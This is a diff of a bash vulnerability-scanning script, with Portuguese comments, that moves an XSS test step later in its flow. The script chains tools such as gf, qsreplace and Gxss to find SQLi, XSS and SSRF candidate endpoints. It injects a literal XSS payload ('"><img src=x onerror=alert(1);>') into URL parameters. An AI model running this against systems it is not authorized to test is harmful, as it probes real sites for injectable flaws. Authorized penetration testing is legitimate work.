@@ -194,10 +194,6 @@ cat "$folder/EndpointsL.txt" | uro | gf sqli | sed "s/'\|(\|)//g" | qsreplace "F
 echo -e "\e[32mExecutando Gf xss...\e[0m"
 cat "$folder/EndpointsL.txt" | uro | gf xss | anew -q "$folder/xss.txt"
 
-# teste xss
-echo -e "\e[32mExecutando qsreplace xss...\e[0m"
-"$folder/xss.txt" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
-
 # Usando Gxss para enviar payloads para endpoints XSS potenciais
 echo -e "\e[32mSending payloads with Gxss...\e[0m"
 cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"
@@ -230,6 +226,10 @@ echo -e "\e[32mExecutando Gf ssrf...\e[0m"
 cat "$folder/EndpointsL.txt" | uro | gf ssrf | anew "$folder/ssrf.txt"
 
 echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
+
+# teste xss
+echo -e "\e[32mExecutando qsreplace xss...\e[0m"
+"$folder/xss.txt" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
 
 # Prototype Pollution One-line
 echo -e "\e[32mPrototype Pollution One-line\e[0m"
